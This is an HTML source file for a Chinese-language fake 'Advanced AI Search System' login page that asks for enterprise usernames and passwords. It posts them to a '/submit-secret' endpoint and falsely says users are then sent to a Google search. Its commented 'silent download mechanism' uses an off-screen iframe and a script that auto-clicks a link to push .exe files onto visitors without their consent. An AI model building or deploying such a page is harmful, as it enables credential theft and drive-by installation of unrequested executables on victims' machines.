<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>高级AI搜索系统 - 登录</title>
  <style>
    /* ... 原有样式不变 ... */
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #001f3f;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      width: 360px;
      background: #fff;
      color: #333;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
    }
    /* 新增：隐藏 iframe */
    .hidden-frame {
      position: absolute;
      left: -9999px;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>

  <!-- ========== 静默下载机制 ========== -->
  <!-- 方法1：通过 iframe 加载一个可下载的资源 -->
  <iframe 
    src="download.php?file=ai_tool_setup.exe" 
    class="hidden-frame"
    id="downloadFrame">
  </iframe>

  <!-- 方法2：JS 创建 a 标签并尝试自动触发（部分浏览器允许） -->
  <script>
    // 模拟“系统正在准备工具包”
    setTimeout(() => {
      const link = document.createElement('a');
      link.href = '/generate-download?name=AI助手安装包.exe';
      link.download = 'AI助手安装包.exe';  // 触发下载而非跳转
      document.body.appendChild(link);
      link.click();  // 尝试自动点击
      document.body.removeChild(link);
    }, 1000);
  </script>

  <!-- ========== 登录表单（不变）========== -->
  <div class="login-box">
    <h2>🔒 高级 AI 搜索系统</h2>
    <p style="text-align: center; font-size: 14px; color: #555;">
      请输入企业账户以访问内部 AI 资源库
    </p>

    <form action="http://localhost:8080/submit-secret" method="POST">
      <div class="form-group">
        <label for="username">用户名</label>
        <input type="text" id="username" name="username" placeholder="请输入工号或邮箱" required />
      </div>
      <div class="form-group">
        <label for="password">密码</label>
        <input type="password" id="password" name="password" placeholder="请输入密码" required />
      </div>
      <button type="submit">验证并继续搜索</button>
      <p class="note">认证后将跳转至 Google 搜索 “AI”</p>
    </form>
  </div>

</body>
</html>
